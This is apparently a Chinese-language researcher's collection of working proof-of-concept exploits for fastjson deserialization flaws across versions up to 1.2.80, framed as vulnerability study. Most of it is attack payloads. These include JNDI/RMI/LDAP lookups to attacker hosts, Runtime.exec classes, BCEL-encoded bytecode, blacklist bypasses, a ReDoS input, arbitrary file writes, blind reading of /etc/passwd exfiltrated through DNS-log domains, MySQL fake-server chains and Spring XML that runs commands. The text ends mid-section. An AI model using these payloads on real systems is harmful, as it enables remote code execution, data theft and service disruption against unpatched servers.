# fastjson 全版本漏洞复现
By. Whoopsunix
# Why fastjson？
fastjson复现简单、调用链多，很多时候反而更像是在看其他组件的序列化链，很适合拿来做java研究

所以起了个项目记录自己复现过的POC，既然做了就干脆给出pom依赖，毕竟找环境还是挺麻烦的

后续poc 环境 分析文章在 github 同步
https://github.com/Whoopsunix/fastjson_study

环境见
https://github.com/Whoopsunix/PPPVULNS

+ 值得留意的文章
+  https://github.com/LeadroyaL/fastjson-blacklist fastjson黑白名单
+  https://github.com/safe6Sec/Fastjson  目前最全的poc合集
+  https://github.com/su18/hack-fastjson-1.2.80 1.2.80 POC
+  https://github.com/safe6Sec/ShiroAndFastJson 1.2.80 poc含环境
+  https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA  版本区分
+  https://b1ue.cn/archives/506.html 浅蓝博客
+  https://github.com/knownsec/KCon/tree/master/2022 浅蓝kcon分享

# fastjson <=1.2.24 反序列化代码执行
## JdbcRowSetImpl
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.16.126:1099/whoopsunix","autoCommit":true}
```

## TemplatesImpl
```json
{
	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
	"_bytecodes": ["base64 poc"],
	"_name": "Whoopsunix",
	"_tfactory": {},
	"_outputProperties": {},
}
```

Exec.java
```java
public class Exec extends AbstractTranslet {  
    static {  
        try {  
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");  
        } catch (Exception e){  
  
        }  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
  
    }  
}
```

## bcel
### tomcat-dbcp
```xml
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-dbcp</artifactId>  
    <version>7.0.47</version>  
</dependency>
```

```http
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
cmd: whoami


{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
        }
    }: "x"
}
```

```xml
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-dbcp</artifactId>  
    <version>8.5.42</version>  
</dependency>
```

```json
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
cmd: whoami

{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$"
        }
    }: "x"
}
```

## spring
### PropertyPathFactoryBean
```xml
<dependency>  
    <groupId>org.springframework.boot</groupId>  
    <artifactId>spring-boot-starter</artifactId>  
</dependency>
```

```json
{
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "rmi://192.168.1.2:1099/whoopsunix",
    "propertyPath": "whoopsunix",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "rmi://192.168.1.2:1099/whoopsunix"
      ]
    }
}
```


### DefaultBeanFactoryPointcutAdvisor
```xml
<dependency>  
    <groupId>org.springframework.boot</groupId>  
    <artifactId>spring-boot-starter</artifactId>  
</dependency>
```

```json
{
  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
   "beanFactory": {
     "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
     "shareableResources": [
       "rmi://192.168.1.2:1099/whoopsunix"
     ]
   },
   "adviceBeanName": "rmi://192.168.1.2:1099/whoopsunix"
}
```

# fastjson <=1.2.41 反序列化代码执行(黑名单)

开启autotype
`ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`

```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://192.168.16.126:1099/whoopsunix", "autoCommit":true}
```

#  fastjson <=1.2.42 反序列化代码执行
开启autotype
```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://192.168.16.126:1099/whoopsunix", "autoCommit":true}
```

# fastjson <=1.2.43 反序列化代码执行
开启autotype
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"rmi://192.168.16.126:1099/whoopsunix", "autoCommit":true}
```

# fastjson <=1.2.45 反序列化代码执行
## mybatis
开启autotype
mybatis：3.x.x<3.5.0

```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://192.168.16.126:1099/whoopsunix"}}
```

# fastjson <=1.2.47 反序列化代码执行
## 缓存通杀
对于1.2.25-1.2.32：需关闭AutoTypeSupport

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.16.126:1099/whoopsunix",
        "autoCommit":true
    }
}
```

## bcel
### tomcat-dbcp
同样 7 和 8+ payload不一样
```xml
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-dbcp</artifactId>  
    <version>8.5.42</version>  
</dependency>
```

```http
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
cmd: whoami

{
    "name":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "y": {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$..",

                     "$ref": "$.x.y.c.connection"
            }
        }
    }
}
```

### ibatis
```xml
<dependency>  
    <groupId>org.mybatis</groupId>  
    <artifactId>mybatis</artifactId>  
    <version>3.5.0</version>  
</dependency>
```

```http
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
cmd: whoami


{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"{$$BCEL$$..}"}}
```



# Fastjson 1.2.36 - 1.2.62 远程拒绝服务
1.2.62_noneautotype、1.2.60.sec09_noneautotype、1.2.60_noneautotype 同样存在漏洞
```json
{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}

{"regex":{"$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]"},"blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```

# fastjson <= 1.2.60 反序列化代码执行
开启autotype
```xml
<dependency>
    <groupId>commons-configuration</groupId>
    <artifactId>commons-configuration</artifactId>
    <version>1.10</version>
</dependency>
```

```json
{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://192.168.16.126:1099/whoopsunix"}
```

# fastjson <= 1.2.61 反序列化代码执行
## configuration
开启autotype
```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-configuration2</artifactId>
    <version>2.7</version>
</dependency>
```

```json
{"@type":"org.apache.commons.configuration2.JNDIConfiguration","prefix":"rmi://192.168.16.126:1099/whoopsunix"}
```

# fastjson <=1.2.62 反序列化代码执行
## xbean-reflect(确认版本是否1.2.68可用)
开启autotype
```xml
<dependency>
    <groupId>org.apache.xbean</groupId>
    <artifactId>xbean-reflect</artifactId>
    <version>4.14</version>
</dependency>
```

```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/whoopsunix"}
```

# fastjson <= 1.2.66 反序列化代码执行
## shiro
开启autotype

```xml
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.5.3</version>
</dependency>
```

```json
// parseObject
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/whoopsunix"}
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/whoopsunix"], "Realms":[""]}
```

## Anteros
开启autotype
```xml
<dependency>
    <groupId>br.com.anteros</groupId>
    <artifactId>Anteros-Core</artifactId>
    <version>1.2.2</version>
</dependency>
<dependency>
    <groupId>br.com.anteros</groupId>
    <artifactId>Anteros-DBCP</artifactId>
    <version>1.0.1</version>
</dependency>
```

```json
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/whoopsunix"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://localhost:1389/whoopsunix"}
```

## ignite-jta
开启autotype
```xml
<dependency>
    <groupId>org.apache.ignite</groupId>
    <artifactId>ignite-jta</artifactId>
    <version>2.7.6</version>
</dependency>
```

```json
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/whoopsunix"}
```

# fastjson <= 1.2.67 反序列化代码执行和SSRF漏洞
## shiro
开启autotype
```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.67</version>
    <scope>compile</scope>
</dependency>
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.5.3</version>
</dependency>
```

```json
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/whoopsunix","instance":{"$ref":"$.instance"}}
```

## ignite-jta
开启autotype
```xml
<!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-jta -->
<dependency>
    <groupId>org.apache.ignite</groupId>
    <artifactId>ignite-jta</artifactId>
    <version>2.7.6</version>
</dependency>
```

```json
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/whoopsunix"], "tm": {"$ref":"$.tm"}}
```

# fastjson <=1.2.68 反序列化代码执行(AutoCloseable)
## AutoCloseable demo
```json
{"@type":"java.lang.AutoCloseable","@type":"Test","cmd":"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}
```

```java
public class Test implements AutoCloseable{
    public Test(String cmd){
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void close() throws Exception {

    }
}
```

## write file demo(Jdk11)

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileOutputStream",
  "file": "/tmp/nonexist",
  "append": "false"
}
```

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileWriter",
  "file": "/tmp/nonexist",
  "append": "false"
}
```



## MarshalOutputStream 写文件 需要进一步验证

1.2.70以下jdk11可用

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "sun.rmi.server.MarshalOutputStream",
    "out": {
        "@type": "java.util.zip.InflaterOutputStream",
        "out": {
           "@type": "java.io.FileOutputStream",
           "file": "/tmp/asdasd",
           "append": true
        },
        "infl": {
           "input": {
               "array": "eJxLLE5JTCkGAAh5AnE=",
               "limit": 14
           }
        },
        "bufLen": "100"
    },
    "protocolVersion": 1
}
```

## SafeFileOutputStream 文件内容迁移 jdk11测试
target 不存在，temp 存在，则会调用 copy 方法将 temp 的内容迁移到 target
```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.5.4</version>
</dependency>
```

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
    "targetPath": "/Users/whoopsunix/Desktop/test",
    "tempPath": "/Users/whoopsunix/Desktop/pass"
}
```



## SafeFileOutputStream 追加写文件
都不存在，BufferedOutputStream -> targetPath
targetPath存在，tempPath 不存在，BufferedOutputStream -> tempPath
targetPath不存在，tempPath 存在，BufferedOutputStream -> targetPath
targetPath存在，tempPath 存在，BufferedOutputStream -> tempPath，利用io复写绕检测

```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.5.4</version>
</dependency>
<dependency>
    <groupId>com.esotericsoftware</groupId>
    <artifactId>kryo</artifactId>
    <version>4.0.0</version>
</dependency>
<dependency>
    <groupId>com.sleepycat</groupId>
    <artifactId>je</artifactId>
    <version>18.3.12</version>
</dependency>
```

```json
{
    "stream": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
        "targetPath": "C:/Users/whoopsunix/Desktop/ls/ls/4.txt",
        "tempPath": "a"
    },
    "writer": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.esotericsoftware.kryo.io.Output",
        "buffer": "Y2VzaGk=",
        "outputStream": {
            "$ref": "$.stream"
        },
        "position": 5
    },
    "close": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.sleepycat.bind.serial.SerialOutput",
        "out": {
            "$ref": "$.writer"
        }
    }
}
```

## Commons IO 2.x 读文件
### 利用报错信息逐个猜解(类似盲注)
byte 十进制ASCII码
```json
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///etc/passwd"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
                    60,101
                ]
            }
        ]
    },
    "address": {
        "$ref": "$.abc.BOM"
    }
}
```

```xml
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.1</version>
</dependency>
```

文件内容为 test，对应ascii[116,101,115,116]
```json
# 逐位填入bytes，可利用二分法爆破
# 正确则返回base64结果
{"abc":{"bOM":{"bytes":"dGVzdA==","charsetName":"UTF-8"},"bOMCharsetName":"UTF-8"},"address":{"$ref":"$.abc.bOM"}}
# 错误
{"abc":{}}
```



### 利用类型不一致报错
```json
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///etc/passwd"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
                    60,101
                ]
            }
        ]
    },
    "address": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
            "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
            "start": 0,
            "end": 0
        }
    }
}
```


### 无回显 对比正确时请求dnslog
https://tyskill.github.io/posts/fastjson%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6/
```json
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
	  "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
		"@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///etc/passwd"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [116,101,115,116]
      }
    ]
  },
  "address": {
	  "@type": "java.lang.AutoCloseable",
	  "@type": "org.apache.commons.io.input.BOMInputStream",
	  "delegate": {
		"@type": "org.apache.commons.io.input.ReaderInputStream",
		"reader": {
		  "@type": "jdk.nashorn.api.scripting.URLReader",
		  "url": "http://fj.ppp.dnslog.pw"
		},
		"charsetName": "UTF-8",
		"bufferSize": 1024
	  },
	  "boms": [{"$ref":"$.abc.BOM[0]"}]
  },
  "xxx":{"$ref":"$.address.BOM[0]"}
}
```

### 无回显 对比不正确时请求dnslog 很麻烦
```json
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///etc.passwd"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [
          48,
        ]
      }
    ]
  },
  "address" : {
	"@type": "java.lang.AutoCloseable",
	"@type":"org.apache.commons.io.input.CharSequenceReader",
	"charSequence": {
		"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"
	},
	"start": 0,
	"end": 0
  },
  "xxx":{{"@type":"java.net.Inet4Address","val":"cnm.awm6.hyuga.icu"}:"xx"}
}

```

## Mysql connect RCE
## Fake Server
> https://github.com/dushixiang/evil-mysql-server
> https://github.com/fnmsd/MySQL_Fake_Server

```xml
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>5.1.11</version>
</dependency>
```

### 5.1.11<=version<=5.1.48
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "127.0.0.1",
    "portToConnectTo": 3306,
    "info": {
        "user": "yso_CommonsCollections5_calc",
        "password": "pass",
        "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
        "autoDeserialize": "true",
        "NUM_HOSTS": "1"
    },
    "databaseToConnectTo": "dbname",
    "url": ""
}
```

### 6.0.2 or 6.0.3
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
    "proxy": {
        "connectionString": {
            "url": "jdbc:mysql://localhost:3306/test?allowLoadLocalInfile=true&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_/System/Applications/Calculator.app/Contents/MacOS/Calculator"
        }
    }
}
```

### 8.0.19
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
        "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
        "connectionUrl": {
            "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
            "masters": [
                {
                    "host": "127.0.0.1"
                }
            ],
            "slaves": [],
            "properties": {
                "host": "127.0.0.1",
                "user": "yso_CommonsCollections5_calc",
                "dbname": "dbname",
                "password": "pass",
                "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "autoDeserialize": "true"
            }
        }
    }
}
```

# fastjson < 1.2.70 反序列化代码执行



# fastjson <= 1.2.80 反序列化代码执行
## groovy RCE
```xml
<dependency>  
    <groupId>org.codehaus.groovy</groupId>  
    <artifactId>groovy</artifactId>  
    <version>3.0.9</version>  
</dependency>
```

新建项目
src/main/java/org/example/GroovyPoc.java
```java
@GroovyASTTransformation(phase = CompilePhase.CONVERSION)  
public class GroovyPoc implements ASTTransformation {  
    public GroovyPoc(){  
        try{  
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");  
        }catch (Exception ex){  
  
        }  
    }  
  
    @Override  
    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {  
  
    }  
}
```
src/main/resources/META-INF/services/org.codehaus.groovy.transform.ASTTransformation
写入恶意类
```
org.example.GroovyPoc
```

```
mvn install
在classes目录开启http服务
```

poc1
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
```
poc2
```json
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://192.168.16.132:1234/"
    }
}
```

## jython
[参考猎鹰](https://mp.weixin.qq.com/s/m2U4zNkLCJvO3l1jChzeFw)
```xml
<!-- https://mvnrepository.com/artifact/org.python/jython -->  
<dependency>  
    <groupId>org.python</groupId>  
    <artifactId>jython</artifactId>  
    <version>2.7.0</version>  
</dependency>
```
### psql
https://mp.weixin.qq.com/s/m2U4zNkLCJvO3l1jChzeFw
```xml
<dependency>  
    <groupId>org.postgresql</groupId>  
    <artifactId>postgresql</artifactId>  
    <version>42.3.1</version>  
</dependency>
```

```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type":"org.postgresql.jdbc.PgConnection",
			"hostSpecs":[{"host":"127.0.0.1","port":2333}],
			"user":"user",
			"database":"test",
			"info":{
				"socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
				"socketFactoryArg":"http://127.0.0.1:1234/exp.xml"
			},
			"url":""
		}
	}
}
```

任意spring bean xml exp，其他payload可[参考](https://gv7.me/articles/2021/some-extensions-of-spring-bean-rce-under-weblogic/)
exp.xml - jndi
```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                        http://www.springframework.org/schema/beans/spring-beans.xsd">
	<bean class="javax.naming.InitialContext" factory-method="doLookup">
		<constructor-arg type="java.lang.String" value="ldap://192.168.66.136:1389/9wbfcp"/>
	</bean>
</beans>
```

exp.xml - cmd
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<beans xmlns="http://www.springframework.org/schema/beans"  
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
       xsi:schemaLocation="http://www.springframework.org/schema/beans  
                        http://www.springframework.org/schema/beans/spring-beans.xsd">  
    <bean id="pb" class="java.lang.ProcessBuilder">  
        <constructor-arg>
            <list>
                <value>cmd.exe</value>  
                <value>/c</value>  
                <value><![CDATA[ calc ]]></value>  
            </list>  
        </constructor-arg>        
        <property name="any" value="#{pb.start()}"/>  
    </bean>
</beans>
```

### mysql
```xml

```

#### 5.1.11<=version<=5.1.48
```json
{
	"a":{
		"@type":"java.lang.Exception",
		"@type":"org.python.antlr.ParseException",
		},
	"b":{
		"@type":"java.lang.Class",
		"val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException",
		"type":{}}}
	},
	"c":{
		"@type":"org.python.core.PyObject",
		"@type":"com.ziclix.python.sql.PyConnection",
		"connection":{
			"@type": "com.mysql.jdbc.JDBC4Connection",
    		"hostToConnectTo": "192.168.66.136",
    		"portToConnectTo": 3306,
	    	"info": {
		        "user": "yso_CommonsCollections4_calc",
		        "password": "pass",
		        "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
		        "autoDeserialize": "true",
		        "NUM_HOSTS": "1"
    		},
    		"databaseToConnectTo": "dbname",
    		"url": ""
		}
	}
}

```

#### 6.0.2 or 6.0.3
```json
